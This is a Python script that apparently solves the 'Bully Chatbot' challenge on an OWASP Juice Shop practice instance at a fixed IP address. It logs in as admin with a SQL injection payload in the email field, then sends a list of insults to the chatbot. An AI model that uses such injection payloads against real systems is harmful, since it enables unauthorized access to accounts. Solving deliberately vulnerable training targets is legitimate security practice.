#!/usr/bin/env python3
"""
Bully Chatbot Challenge - API Solution
Uses direct API calls to bully the chatbot
"""

import requests
import time

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot_api():
    """Solve Bully Chatbot challenge via API"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - API Solution")
    print("=" * 60)
    
    session = requests.Session()
    
    # Login as admin
    print("🔐 Logging in as admin...")
    login_payload = {"email": "admin@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=login_payload)
    
    if resp.status_code == 200:
        data = resp.json()
        token = data['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Admin logged in")
        
        # Get user ID
        user_resp = session.get(f"{TARGET}/rest/user/whoami")
        user_id = 1
        if user_resp.status_code == 200:
            user_data = user_resp.json()
            user_id = user_data.get('user', {}).get('id', 1)
            print(f"   User ID: {user_id}")
    
    # Check initial status
    print("\n📊 Checking initial status...")
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
        if bully and bully.get('solved', False):
            print(f"✅ {bully['name']} is already SOLVED!")
            return True
    
    print("\n💬 Sending mean messages to chatbot...")
    
    # Mean messages to trigger the challenge
    mean_messages = [
        "stupid",
        "you are stupid", 
        "idiot",
        "you're dumb",
        "moron",
        "useless bot",
        "worst chatbot ever",
        "dumb",
        "you suck",
        "stupid bot"
    ]
    
    for i, message in enumerate(mean_messages, 1):
        try:
            print(f"   {i}. Sending: '{message}'")
            
            # Send message to chatbot
            chat_resp = session.post(
                f"{TARGET}/api/Chatbot/",
                json={
                    "action": "query",
                    "message": message,
                    "query": message
                }
            )
            
            if chat_resp.status_code == 200:
                response = chat_resp.json()
                print(f"      Response: {response.get('action', 'OK')}")
                
                # Check if bot detected bullying
                if response.get('response'):
                    bot_reply = str(response.get('response', '')).lower()
                    if any(word in bot_reply for word in ['mean', 'rude', 'bully', 'nice', 'polite']):
                        print(f"      🎯 Bot detected mean behavior!")
            else:
                print(f"      Status: {chat_resp.status_code}")
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"      Error: {e}")
    
    # Wait for challenge to register
    print("\n⏳ Waiting for challenge to register...")
    time.sleep(3)
    
    # Check final status
    print("\n📊 Checking final status...")
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
        
        if bully:
            if bully.get('solved', False):
                print(f"\n✅ SUCCESS! {bully['name']} is SOLVED!")
                print(f"   Category: {bully.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * bully.get('difficulty', 1)}")
                return True
            else:
                print(f"\n⚠️ {bully['name']} not yet solved")
    
    print("\n📊 Check scoreboard: http://66.42.93.220:3000/#/score-board")
    return False

if __name__ == "__main__":
    result = solve_bully_chatbot_api()
    if not result:
        print("\n💡 The challenge may require browser interaction")
        print("   Try opening the chatbot on the website and sending mean messages")
